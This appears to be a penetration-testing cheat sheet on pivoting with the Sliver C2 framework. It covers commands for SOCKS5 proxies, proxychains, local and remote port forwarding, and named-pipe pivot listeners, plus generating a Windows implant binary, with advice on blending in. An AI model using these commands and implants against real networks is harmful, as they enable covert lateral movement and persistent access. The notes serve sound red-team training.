# Pivots

## <mark style="color:$primary;">SOCKS5</mark>

#### <mark style="color:yellow;">Start SOCKS5 Proxy</mark>

```bash
socks5 start | or --bind 127.0.0.1 --port 1080
socks5 stop
```

#### <mark style="color:yellow;">ProxyChains Configuration</mark>

```bash
sudo nano /etc/proxychains.conf

socks5 127.0.0.1 1081
```

## <mark style="color:$primary;">PORT FORWARDING</mark>

#### <mark style="color:yellow;">Local</mark>

```bash
portfwd add --bind <local_host>:<local_port> --remote <target_host>:<target_port>
portfwd add --bind 127.0.0.1:1337 --remote 10.10.10.5:3306
```

#### <mark style="color:yellow;">Remote</mark>

```bash
rportfwd add --remote <pivot_host>:<pivot_port> --bind <attacker_host>:<attacker_port>
rportfwd add --remote 0.0.0.0:4444 --bind 127.0.0.1:4444
```

## <mark style="color:$primary;">NAMED PIPES</mark>

Named pipe is a concept for creating communication between a server and a client; this can be a process on computer A and a process on computer B. Each pipe has a unique name following the format of `\\ServerName\pipe\PipeName` or `\\.\pipe\PipeName`. In most cases, one of your tasks would be to blend in as much as possible.&#x20;

{% hint style="info" %}
Enumerating named pipes on Windows Systems can be done via the `ls` command in PowerShell followed by the `\\.\pipe\` directory.
{% endhint %}

```bash
[server] sliver (http_beacon) > pivots named-pipe --bind academy

[*] Started named pipe pivot listener \\.\pipe\academy with id 1
```

After starting the pipe pivot listener, we need to generate a pivot implant using the `generate` command.

```bash
sliver > generate --named-pipe 127.0.0.1/pipe/academy -N pipe_academy --skip-symbols

[*] Generating new windows/amd64 implant binary
[!] Symbol obfuscation is disabled
[*] Build completed in 1s
[*] Implant saved to /home/htb-ac-8414/pipe_academy.exe
```
